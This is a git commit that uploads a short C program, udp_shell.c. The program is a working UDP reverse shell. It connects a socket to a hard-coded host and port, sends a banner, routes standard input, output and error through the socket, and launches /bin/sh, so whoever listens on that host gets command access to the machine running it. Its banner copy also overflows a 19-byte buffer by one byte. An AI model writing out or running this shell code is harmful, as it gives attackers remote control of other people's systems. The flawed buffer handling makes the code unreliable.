e62b9d726a6eae24c6c52074975dab1bef6640ae
00xc <48725664+00xc@users.noreply.github.com>
2019-05-28 22:48:22 +0200

    Add files via upload

---
+++ udp_shell.c
@@ -0,0 +1,35 @@
+#include <stdio.h>
+#include <sys/socket.h>	/* socket()  */
+#include <unistd.h>	/* execve()  */
+#include <netinet/ip.h>
+#include <arpa/inet.h>
+#include <string.h>
+
+int main(int argc, char *argv[]){
+
+	const char *host = "127.0.0.1";
+	int port = 9999;
+
+	struct sockaddr_in address;
+	address.sin_family = AF_INET;
+	address.sin_port = htons(port);
+	inet_aton(host, &address.sin_addr);
+
+	int s = socket(AF_INET, SOCK_DGRAM, 0);
+	connect(s, (struct sockaddr*)&address, sizeof(address));
+
+	char buf[19];
+	strcpy(buf, "Starting UDP shell\n");
+	sendto(s, &buf, strlen(buf)+1, 0, (struct sockaddr*)&address, sizeof(address));
+
+	/* Copy file descriptors */
+	printf("Copying fds\n");
+	dup2(s, STDIN_FILENO);
+	dup2(s, STDOUT_FILENO);
+	dup2(s, STDERR_FILENO);
+
+	execve("/bin/sh", NULL, NULL);
+
+	return 0;
+
+}
